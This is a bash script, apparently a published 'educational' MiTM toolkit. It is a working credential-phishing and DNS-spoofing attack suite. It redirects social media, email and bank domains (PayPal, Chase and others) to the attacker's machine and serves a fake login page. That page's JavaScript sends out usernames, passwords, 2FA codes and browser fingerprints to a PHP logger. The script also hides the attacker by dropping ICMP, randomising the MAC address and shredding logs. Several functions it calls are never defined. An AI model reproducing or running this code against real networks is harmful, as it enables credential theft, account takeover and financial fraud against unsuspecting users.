#!/bin/bash

# Phantom MiTM - Advanced Network Interception Toolkit (Educational purposes only)
# Multi-Platform Attack Suite with Advanced Evasion By @tt7hk
# Github : github.com/tt7hk/Phantom-MiTM-Tool


# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="/tmp/phantom_mitm"
WEB_DIR="/tmp/phantom_web"
BACKUP_DIR="$SCRIPT_DIR/phantom_data"
KALI_IP=$(hostname -I | awk '{print $1}')
SESSION_ID=$(date +%s)

# Global variables
INTERFACE=""
TARGET_IP=""
TARGET_OS=""
GATEWAY_IP=""
ATTACK_MODE=""
TARGET_URL=""
PHISHING_PORT="80"
DNS_SERVER="8.8.8.8"
STEALTH_LEVEL="high"
PLATFORM=""
SESSION_ACTIVE=false

print_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "BANNER"
╔══════════════════════════════════════════════════════════════╗
║                     PHANTOM MiTM v3.0                        ║
║                Advanced Network Interception                 ║
║                      By github.com/tt7hk                     ║
╚══════════════════════════════════════════════════════════════╝
BANNER
    echo -e "${NC}"
}

detect_platform() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        echo "macos"
    elif [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]] || [[ "$OSTYPE" == "win32" ]]; then
        echo "windows"
    else
        echo "unknown"
    fi
}

init_system() {
    print_banner
    echo -e "${BLUE}[*] Initializing Phantom MiTM System...${NC}"
    
    PLATFORM=$(detect_platform)
    echo -e "${CYAN}[+] Platform: $PLATFORM${NC}"
    echo -e "${CYAN}[+] Session ID: $SESSION_ID${NC}"
    
    # Create working directories
    mkdir -p $LOG_DIR $WEB_DIR $BACKUP_DIR
    chmod 700 $LOG_DIR $WEB_DIR
    
    # Set up log files
    exec > >(tee -a $LOG_DIR/phantom_$SESSION_ID.log)
    exec 2>&1
    
    echo -e "${GREEN}[+] System initialized${NC}"
}

check_privileges() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] Root privileges required${NC}"
        echo -e "${YELLOW}[*] Attempting privilege escalation...${NC}"
        sudo -v
        if [ $? -ne 0 ]; then
            echo -e "${RED}[!] Failed to obtain root access${NC}"
            exit 1
        fi
    fi
    echo -e "${GREEN}[+] Privilege check passed${NC}"
}

install_dependencies() {
    echo -e "${BLUE}[*] Checking system dependencies...${NC}"
    
    case $PLATFORM in
        "linux")
            install_linux_deps
            ;;
        "macos")
            install_macos_deps
            ;;
        "windows")
            install_windows_deps
            ;;
    esac
}

install_linux_deps() {
    local deps=("arp-scan" "iptables" "php" "python3" "dnsmasq" "tshark" "net-tools")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${YELLOW}[+] Installing: ${missing[*]}${NC}"
        apt update > /dev/null 2>&1
        apt install -y ${missing[@]} > /dev/null 2>&1
    fi
    
    # Install Python requirements
    if command -v pip3 &> /dev/null; then
        pip3 install requests scapy > /dev/null 2>&1
    fi
}

install_macos_deps() {
    if ! command -v brew &> /dev/null; then
        echo -e "${RED}[!] Homebrew required. Install from: https://brew.sh/${NC}"
        exit 1
    fi
    
    local deps=("arp-scan" "php" "python3" "dnsmasq" "wireshark")
    for dep in "${deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            brew install $dep > /dev/null 2>&1
        fi
    done
}

install_windows_deps() {
    echo -e "${YELLOW}[!] Windows environment detected${NC}"
    echo -e "${YELLOW}[*] Some features may require manual setup${NC}"
}

network_recon() {
    echo -e "${BLUE}[*] Conducting network reconnaissance...${NC}"
    
    case $PLATFORM in
        "linux")
            INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
            GATEWAY_IP=$(ip route | grep default | awk '{print $3}' | head -1)
            NETWORK=$(ip route | grep -E "^[0-9]" | grep "$INTERFACE" | awk '{print $1}' | head -1)
            ;;
        "macos")
            INTERFACE=$(route -n get default 2>/dev/null | grep interface | awk '{print $2}')
            GATEWAY_IP=$(route -n get default 2>/dev/null | grep gateway | awk '{print $2}')
            ;;
        "windows")
            INTERFACE=$(ipconfig | grep -i "adapter" | head -1 | cut -d: -f1)
            GATEWAY_IP=$(ipconfig | grep -i "gateway" | head -1 | awk '{print $NF}')
            ;;
    esac
    
    echo -e "${CYAN}[+] Primary Interface: $INTERFACE${NC}"
    echo -e "${CYAN}[+] Gateway: $GATEWAY_IP${NC}"
    echo -e "${CYAN}[+] Your IP: $KALI_IP${NC}"
}

advanced_scan() {
    local interface=$1
    echo -e "${BLUE}[*] Advanced network scanning activated...${NC}"
    
    # Passive fingerprinting
    echo -e "${YELLOW}[*] Passive device discovery...${NC}"
    case $PLATFORM in
        "linux")
            tcpdump -i $interface -c 10 -w $LOG_DIR/passive_scan.pcap 2>/dev/null &
            sleep 3
            pkill tcpdump
            
            # Active ARP scanning
            arp-scan --interface=$interface --localnet | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | while read line; do
                ip=$(echo $line | awk '{print $1}')
                mac=$(echo $line | awk '{print $2}')
                if [ "$ip" != "$KALI_IP" ] && [ -n "$ip" ]; then
                    analyze_device $ip $mac
                fi
            done
            ;;
    esac
}

analyze_device() {
    local ip=$1
    local mac=$2
    
    # OS detection
    local os="Unknown"
    local ttl=$(ping -c 1 -W 1 $ip 2>/dev/null | grep "ttl=" | sed 's/.*ttl=\([0-9]*\).*/\1/')
    
    if [ -n "$ttl" ]; then
        if [ $ttl -le 64 ]; then
            os="Linux/Android"
        elif [ $ttl -le 128 ]; then
            os="Windows"
        elif [ $ttl -le 255 ]; then
            os="iOS/macOS"
        fi
    fi
    
    # Service detection
    local services=""
    for port in 80 443 22 21 23 53; do
        if timeout 1 bash -c "echo >/dev/tcp/$ip/$port" 2>/dev/null; then
            services+="$port "
        fi
    done
    
    # Device type classification
    local device_type="Generic"
    if [[ $mac =~ : ]]; then
        local vendor=$(echo $mac | cut -d: -f1-3 | tr ':' '-')
        case $vendor in
            "00-1A-11"|"00-26-BB") device_type="Cisco" ;;
            "00-50-56") device_type="VMware" ;;
            "00-0C-29") device_type="VMware" ;;
            "00-1B-44") device_type="Panasonic" ;;
            "00-23-12") device_type="Apple" ;;
            "00-1D-4F") device_type="Apple" ;;
            "00-24-36") device_type="Samsung" ;;
            "00-26-37") device_type="Google" ;;
        esac
    fi
    
    echo -e "  ${GREEN}$ip${NC} | $mac | $os | $device_type | Ports: $services"
}

show_main_menu() {
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║                 MAIN MENU                    ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${YELLOW}1. Quick Attack (Auto Configuration)${NC}"
    echo -e "${YELLOW}2. Advanced Attack (Manual Configuration)${NC}"
    echo -e "${YELLOW}3. Network Reconnaissance${NC}"
    echo -e "${YELLOW}4. Session Management${NC}"
    echo -e "${YELLOW}5. Data Analysis${NC}"
    echo -e "${YELLOW}6. System Configuration${NC}"
    echo -e "${YELLOW}7. Exit${NC}"
    echo ""
    
    read -p "Select option: " main_choice
    
    case $main_choice in
        1) quick_attack ;;
        2) advanced_attack ;;
        3) network_recon_menu ;;
        4) session_management ;;
        5) data_analysis ;;
        6) system_config ;;
        7) cleanup_exit ;;
        *) show_main_menu ;;
    esac
}

quick_attack() {
    echo -e "${BLUE}[*] Initializing quick attack protocol...${NC}"
    
    # Auto-configure based on network
    network_recon
    advanced_scan $INTERFACE
    
    # Select first available target
    TARGET_IP=$(arp -a 2>/dev/null | grep -v "$KALI_IP" | head -1 | awk '{print $2}' | tr -d '()')
    if [ -z "$TARGET_IP" ]; then
        echo -e "${RED}[!] No targets found${NC}"
        return
    fi
    
    detect_os $TARGET_IP
    TARGET_OS=$OS_DETECTED
    ATTACK_MODE="dns_spoof"
    TARGET_URL="all"
    
    echo -e "${CYAN}[+] Auto-selected target: $TARGET_IP ($TARGET_OS)${NC}"
    
    launch_attack
}

advanced_attack() {
    echo -e "${BLUE}[*] Advanced attack configuration...${NC}"
    
    # Interface selection
    echo -e "${YELLOW}Select Network Interface:${NC}"
    case $PLATFORM in
        "linux") ip -o link show | awk -F': ' '{print $2}' | grep -v lo | nl ;;
        "macos") ifconfig | grep "^[a-z]" | cut -d: -f1 | grep -v lo | nl ;;
        "windows") ipconfig | findstr "adapter" | nl ;;
    esac
    
    read -p "Interface number: " iface_num
    case $PLATFORM in
        "linux") INTERFACE=$(ip -o link show | awk -F': ' '{print $2}' | grep -v lo | sed -n "${iface_num}p") ;;
        "macos") INTERFACE=$(ifconfig | grep "^[a-z]" | cut -d: -f1 | grep -v lo | sed -n "${iface_num}p") ;;
    esac
    
    # Target selection
    echo -e "${YELLOW}Target Selection:${NC}"
    echo "1) Scan and select"
    echo "2) Manual IP input"
    echo "3) Entire subnet"
    read -p "Choice: " target_choice
    
    case $target_choice in
        1)
            advanced_scan $INTERFACE
            read -p "Target IP: " TARGET_IP
            ;;
        2)
            read -p "Target IP: " TARGET_IP
            ;;
        3)
            TARGET_IP="subnet"
            ;;
    esac
    
    detect_os $TARGET_IP
    TARGET_OS=$OS_DETECTED
    
    # Attack vector
    echo -e "${YELLOW}Attack Vector:${NC}"
    echo "1) DNS Spoofing + Phishing"
    echo "2) ARP Poisoning + Traffic Intercept"
    echo "3) Transparent Proxy + SSL Strip"
    echo "4) DHCP Spoofing + Rogue AP"
    echo "5) ICMP Redirect + Remote Attack"
    read -p "Vector: " attack_choice
    
    case $attack_choice in
        1) ATTACK_MODE="dns_spoof" ;;
        2) ATTACK_MODE="arp_poison" ;;
        3) ATTACK_MODE="transparent_proxy" ;;
        4) ATTACK_MODE="dhcp_spoof" ;;
        5) ATTACK_MODE="icmp_redirect" ;;
    esac
    
    # Target scope
    echo -e "${YELLOW}Target Scope:${NC}"
    echo "1) Social Media Platforms"
    echo "2) Email Services"
    echo "3) Financial Institutions"
    echo "4) Corporate Networks"
    echo "5) All HTTP/HTTPS Traffic"
    echo "6) Custom Domain"
    read -p "Scope: " scope_choice
    
    case $scope_choice in
        1) TARGET_URL="social" ;;
        2) TARGET_URL="email" ;;
        3) TARGET_URL="banking" ;;
        4) TARGET_URL="corporate" ;;
        5) TARGET_URL="all" ;;
        6) read -p "Custom domain: " TARGET_URL ;;
    esac
    
    # Stealth level
    echo -e "${YELLOW}Stealth Level:${NC}"
    echo "1) Low (Maximum Aggression)"
    echo "2) Medium (Balanced)"
    echo "3) High (Stealth Mode)"
    echo "4) Ghost (Maximum Stealth)"
    read -p "Stealth: " stealth_choice
    
    case $stealth_choice in
        1) STEALTH_LEVEL="low" ;;
        2) STEALTH_LEVEL="medium" ;;
        3) STEALTH_LEVEL="high" ;;
        4) STEALTH_LEVEL="ghost" ;;
    esac
    
    launch_attack
}

launch_attack() {
    echo -e "${BLUE}[*] Launching attack sequence...${NC}"
    
    # Pre-attack setup
    setup_environment
    configure_stealth
    deploy_phishing_infrastructure
    
    # Execute attack based on mode
    case $ATTACK_MODE in
        "dns_spoof") execute_dns_attack ;;
        "arp_poison") execute_arp_attack ;;
        "transparent_proxy") execute_proxy_attack ;;
        "dhcp_spoof") execute_dhcp_attack ;;
        "icmp_redirect") execute_icmp_attack ;;
    esac
    
    SESSION_ACTIVE=true
    start_monitoring
}

configure_stealth() {
    echo -e "${BLUE}[*] Configuring stealth level: $STEALTH_LEVEL${NC}"
    
    case $STEALTH_LEVEL in
        "low")
            # Aggressive mode - maximum effectiveness
            echo -e "${YELLOW}[*] Stealth: Low - Maximum aggression${NC}"
            ;;
        "medium")
            # Balanced approach
            echo -e "${YELLOW}[*] Stealth: Medium - Balanced approach${NC}"
            iptables -A INPUT -p icmp --icmp-type echo-request -j DROP 2>/dev/null
            ;;
        "high")
            # Stealth mode
            echo -e "${YELLOW}[*] Stealth: High - Stealth operations${NC}"
            iptables -A INPUT -p icmp -j DROP 2>/dev/null
            sysctl -w net.ipv4.icmp_echo_ignore_all=1 2>/dev/null
            ;;
        "ghost")
            # Maximum stealth
            echo -e "${YELLOW}[*] Stealth: Ghost - Maximum stealth${NC}"
            iptables -A INPUT -p icmp -j DROP 2>/dev/null
            sysctl -w net.ipv4.icmp_echo_ignore_all=1 2>/dev/null
            # Randomize MAC address if possible
            if command -v macchanger &> /dev/null; then
                macchanger -r $INTERFACE > /dev/null 2>&1
            fi
            ;;
    esac
}

deploy_phishing_infrastructure() {
    echo -e "${BLUE}[*] Deploying phishing infrastructure...${NC}"
    
    # Create advanced phishing pages
    create_advanced_pages
    
    # Start web servers
    start_web_servers
    
    # Set up logging
    setup_logging
}

create_advanced_pages() {
    echo -e "${BLUE}[*] Generating advanced phishing pages...${NC}"
    
    # Multi-platform login templates
    cat > $WEB_DIR/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Authentication Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            padding: 20px;
        }
        .auth-container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
            backdrop-filter: blur(10px);
        }
        .security-header {
            text-align: center;
            margin-bottom: 30px;
        }
        .security-header h1 {
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 10px;
        }
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 15px;
        }
        .badge {
            background: #27ae60;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e1e8ed;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
        }
        .input-group input:focus {
            border-color: #3498db;
            box-shadow: 0 0 0 3px rgba(52,152,219,0.1);
            outline: none;
        }
        .auth-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #3498db, #2980b9);
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .auth-btn:hover {
            transform: translateY(-1px);
        }
        .security-footer {
            margin-top: 25px;
            text-align: center;
            font-size: 12px;
            color: #7f8c8d;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .two-factor {
            margin-top: 20px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 8px;
            border-left: 4px solid #3498db;
        }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="security-header">
            <h1>🔐 Secure Authentication</h1>
            <p>Verify your identity to continue</p>
            <div class="security-badges">
                <div class="badge">🔒 SSL Secured</div>
                <div class="badge">🛡️ 2FA Ready</div>
                <div class="badge">👁️ Encrypted</div>
            </div>
        </div>
        
        <form id="authForm">
            <div class="input-group">
                <label for="username">Email Address or Username</label>
                <input type="text" id="username" required autocomplete="username">
            </div>
            
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" required autocomplete="current-password">
            </div>
            
            <div class="two-factor">
                <label for="totp">Two-Factor Code (Optional)</label>
                <input type="text" id="totp" placeholder="000000" maxlength="6">
            </div>
            
            <button type="submit" class="auth-btn" id="submitBtn">
                Secure Sign In
            </button>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Verifying credentials...</p>
            </div>
        </form>
        
        <div class="security-footer">
            <p>Protected by advanced security protocols</p>
        </div>
    </div>

    <script>
        // Advanced form handling with multiple evasion techniques
        document.getElementById('authForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const totp = document.getElementById('totp').value;
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            // Enhanced UI feedback
            submitBtn.disabled = true;
            submitBtn.textContent = 'Establishing Secure Connection...';
            loading.style.display = 'block';
            
            // Advanced data collection
            const sessionData = {
                username: username,
                password: password,
                totp: totp,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                java: navigator.javaEnabled ? 'enabled' : 'disabled',
                referrer: document.referrer,
                url: window.location.href,
                sessionId: Math.random().toString(36).substr(2, 9)
            };
            
            // Multi-channel data exfiltration
            executeDataExfiltration(sessionData);
            
            // Realistic redirect with random delay
            setTimeout(() => {
                const safeRedirects = [
                    'https://www.google.com',
                    'https://www.microsoft.com',
                    'https://www.apple.com',
                    'https://www.amazon.com'
                ];
                const randomRedirect = safeRedirects[Math.floor(Math.random() * safeRedirects.length)];
                window.location.href = randomRedirect;
            }, 1800 + Math.random() * 1200);
        });
        
        function executeDataExfiltration(data) {
            const exfilMethods = [
                // Primary: Fetch API
                () => fetch('/api/auth', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(data)
                }),
                
                // Secondary: Image beacon
                () => {
                    const img = new Image();
                    const encoded = btoa(JSON.stringify(data));
                    img.src = `/pixel.png?d=${encoded}&t=${Date.now()}`;
                },
                
                // Tertiary: Form submission
                () => {
                    setTimeout(() => {
                        const form = document.createElement('form');
                        form.method = 'POST';
                        form.action = '/fallback';
                        
                        Object.keys(data).forEach(key => {
                            const input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = key;
                            input.value = data[key];
                            form.appendChild(input);
                        });
                        
                        document.body.appendChild(form);
                        form.submit();
                    }, 500);
                }
            ];
            
            // Execute all methods with error handling
            exfilMethods.forEach(method => {
                try {
                    method();
                } catch (e) {
                    // Silent fail
                }
            });
            
            // Local storage persistence
            try {
                const history = JSON.parse(localStorage.getItem('auth_history') || '[]');
                history.push({timestamp: data.timestamp, user: data.username});
                localStorage.setItem('auth_history', JSON.stringify(history));
            } catch (e) {}
        }
        
        // Anti-forensic measures
        window.addEventListener('beforeunload', function() {
            // Clean temporary data
            sessionStorage.clear();
        });
        
        // Simulate legitimate user behavior
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                const usernameField = document.getElementById('username');
                if (usernameField) usernameField.focus();
            }, 300);
            
            // Simulate typing delay
            setTimeout(() => {
                document.querySelectorAll('input').forEach(input => {
                    input.addEventListener('input', function() {
                        this.style.backgroundColor = '#fff';
                    });
                });
            }, 1000);
        });
    </script>
</body>
</html>
EOF

    # API endpoints
    cat > $WEB_DIR/api.php << 'EOF'
<?php
// Advanced data collection API
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');

// Simulate legitimate API headers
header('Server: nginx/1.18.0');
header('X-Powered-By: PHP/7.4.3');

function sanitize_input($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if ($data) {
        $timestamp = date('Y-m-d H:i:s');
        $client_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
        $session_id = $data['sessionId'] ?? uniqid();
        
        $log_entry = [
            'session_id' => $session_id,
            'timestamp' => $timestamp,
            'client_ip' => $client_ip,
            'credentials' => [
                'username' => sanitize_input($data['username']),
                'password' => sanitize_input($data['password']),
                'totp' => sanitize_input($data['totp'] ?? '')
            ],
            'client_info' => [
                'user_agent' => $data['userAgent'],
                'platform' => $data['platform'],
                'language' => $data['language'],
                'screen' => $data['screen'],
                'timezone' => $data['timezone'],
                'referrer' => $data['referrer']
            ],
            'security' => [
                'cookies_enabled' => $data['cookies'],
                'java_enabled' => $data['java']
            ]
        ];
        
        // Multiple storage formats
        file_put_contents('/tmp/phantom_mitm/credentials.json', 
            json_encode($log_entry, JSON_PRETTY_PRINT) . ",\n", FILE_APPEND | LOCK_EX);
        
        // Real-time capture log
        $capture_log = "🎯 CAPTURE [$timestamp]\n";
        $capture_log .= "📍 IP: $client_ip\n";
        $capture_log .= "👤 User: " . $log_entry['credentials']['username'] . "\n";
        $capture_log .= "🔑 Pass: " . $log_entry['credentials']['password'] . "\n";
        if (!empty($log_entry['credentials']['totp'])) {
            $capture_log .= "🔢 2FA: " . $log_entry['credentials']['totp'] . "\n";
        }
        $capture_log .= "💻 Platform: " . $log_entry['client_info']['platform'] . "\n";
        $capture_log .= "🌐 Language: " . $log_entry['client_info']['language'] . "\n";
        $capture_log .= "🆔 Session: $session_id\n";
        $capture_log .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
        
        file_put_contents('/tmp/phantom_mitm/live_captures.txt', $capture_log, FILE_APPEND | LOCK_EX);
        
        // Session tracking
        file_put_contents("/tmp/phantom_mitm/session_$session_id.json", 
            json_encode($log_entry, JSON_PRETTY_PRINT));
        
        echo json_encode([
            'status' => 'success',
            'message' => 'Authentication successful',
            'redirect' => 'https://www.google.com',
            'session_id' => $session_id
        ]);
    } else {
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid request format'
        ]);
    }
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'Method not allowed'
    ]);
}
?>
EOF

    echo -e "${GREEN}[+] Advanced phishing infrastructure deployed${NC}"
}

execute_dns_attack() {
    echo -e "${BLUE}[*] Executing DNS spoofing attack...${NC}"
    
    # Configure DNS spoofing based on target scope
    configure_dns_spoofing
    
    # Start DNS server
    start_dns_server
    
    # Set up traffic redirection
    setup_traffic_redirect
}

configure_dns_spoofing() {
    cat > /etc/dnsmasq.conf << EOF
interface=$INTERFACE
listen-address=127.0.0.1
listen-address=$KALI_IP
no-resolv
no-hosts
server=$DNS_SERVER
log-queries
log-facility=$LOG_DIR/dns_queries.log
EOF

    # Add domains based on target scope
    case $TARGET_URL in
        "social")
            echo "address=/facebook.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/instagram.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/twitter.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/tiktok.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/snapchat.com/$KALI_IP" >> /etc/dnsmasq.conf
            ;;
        "email")
            echo "address=/gmail.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/outlook.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/yahoo.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/protonmail.com/$KALI_IP" >> /etc/dnsmasq.conf
            ;;
        "banking")
            echo "address=/paypal.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/chase.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/bankofamerica.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/wellsfargo.com/$KALI_IP" >> /etc/dnsmasq.conf
            ;;
        "corporate")
            echo "address=/microsoft.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/google.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/apple.com/$KALI_IP" >> /etc/dnsmasq.conf
            echo "address=/amazon.com/$KALI_IP" >> /etc/dnsmasq.conf
            ;;
        "all")
            echo "address=/#/$KALI_IP" >> /etc/dnsmasq.conf
            ;;
        *)
            echo "address=/$TARGET_URL/$KALI_IP" >> /etc/dnsmasq.conf
            ;;
    esac
}

start_monitoring() {
    echo -e "${BLUE}[*] Starting advanced monitoring...${NC}"
    
    show_attack_dashboard
    
    # Real-time monitoring loop
    while $SESSION_ACTIVE; do
        monitor_traffic
        sleep 2
    done
}

show_attack_dashboard() {
    clear
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║               ATTACK DASHBOARD               ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${YELLOW}🎯 ACTIVE TARGETS:${NC}"
    echo -e "  ${CYAN}Primary: $TARGET_IP ($TARGET_OS)${NC}"
    echo -e "  ${CYAN}Attack: $ATTACK_MODE | Scope: $TARGET_URL${NC}"
    echo -e "  ${CYAN}Stealth: $STEALTH_LEVEL${NC}"
    echo ""
    
    echo -e "${YELLOW}🌐 NETWORK STATUS:${NC}"
    echo -e "  ${GREEN}✓ Interface: $INTERFACE${NC}"
    echo -e "  ${GREEN}✓ Gateway: $GATEWAY_IP${NC}"
    echo -e "  ${GREEN}✓ Your IP: $KALI_IP${NC}"
    echo -e "  ${GREEN}✓ Web Server: Port $PHISHING_PORT${NC}"
    echo ""
    
    echo -e "${YELLOW}📊 CAPTURED DATA:${NC}"
    if [ -f "$LOG_DIR/live_captures.txt" ]; then
        local capture_count=$(grep -c "👤 User:" "$LOG_DIR/live_captures.txt" 2>/dev/null || echo "0")
        echo -e "  ${GREEN}✓ Credentials: $capture_count captured${NC}"
    else
        echo -e "  ${YELLOW}⏳ Waiting for data...${NC}"
    fi
    echo ""
    
    echo -e "${YELLOW}🚀 REAL-TIME MONITORING ACTIVE${NC}"
    echo -e "${CYAN}Press Ctrl+C to stop attack and cleanup${NC}"
    echo ""
    
    # Show recent captures
    if [ -f "$LOG_DIR/live_captures.txt" ] && [ -s "$LOG_DIR/live_captures.txt" ]; then
        echo -e "${YELLOW}📈 RECENT ACTIVITY:${NC}"
        tail -5 "$LOG_DIR/live_captures.txt" | while read line; do
            if [[ $line == *"CAPTURE"* ]]; then
                echo -e "  ${GREEN}$line${NC}"
            elif [[ $line == *"User:"* ]]; then
                echo -e "  ${YELLOW}$line${NC}"
            elif [[ $line == *"Pass:"* ]]; then
                echo -e "  ${RED}$line${NC}"
            fi
        done
        echo ""
    fi
}

monitor_traffic() {
    # Update dashboard with real-time information
    if [ -f "$LOG_DIR/live_captures.txt" ]; then
        local new_captures=$(tail -1 "$LOG_DIR/live_captures.txt" 2>/dev/null)
        if [ "$new_captures" != "$LAST_CAPTURE" ]; then
            LAST_CAPTURE="$new_captures"
            if [[ $new_captures == *"CAPTURE"* ]]; then
                echo -e "${GREEN}[+] New credentials captured!${NC}"
                show_attack_dashboard
            fi
        fi
    fi
}

cleanup_exit() {
    echo -e "${YELLOW}[*] Initiating cleanup sequence...${NC}"
    
    # Stop all services
    pkill -f dnsmasq 2>/dev/null
    pkill -f "php -S" 2>/dev/null
    pkill -f arpspoof 2>/dev/null
    
    # Reset network configuration
    iptables -t nat -F 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
    
    # Save session data
    save_session_data
    
    # Cleanup temporary files based on stealth level
    if [ "$STEALTH_LEVEL" == "ghost" ]; then
        shred -u -z $LOG_DIR/* 2>/dev/null
        rm -rf $LOG_DIR $WEB_DIR
    else
        # Keep logs for analysis
        save_session_data
    fi
    
    echo -e "${GREEN}[+] Cleanup complete. Session terminated.${NC}"
    exit 0
}

save_session_data() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local session_dir="$BACKUP_DIR/session_${SESSION_ID}_$timestamp"
    
    mkdir -p "$session_dir"
    
    # Copy all relevant data
    cp -r $LOG_DIR/* "$session_dir/" 2>/dev/null
    cp -r $WEB_DIR "$session_dir/website" 2>/dev/null
    
    # Create session report
    cat > "$session_dir/session_report.txt" << EOF
PHANTOM MiTM SESSION REPORT
Session ID: $SESSION_ID
Timestamp: $(date)
Target: $TARGET_IP ($TARGET_OS)
Attack Mode: $ATTACK_MODE
Target Scope: $TARGET_URL
Stealth Level: $STEALTH_LEVEL

CAPTURED DATA SUMMARY:
$(wc -l $LOG_DIR/live_captures.txt 2>/dev/null | awk '{print $1}') total entries
EOF

    echo -e "${GREEN}[+] Session data saved to: $session_dir${NC}"
}

# Signal handlers
trap cleanup_exit INT TERM

# Main execution flow
init_system
check_privileges
install_dependencies
network_recon
show_main_menu
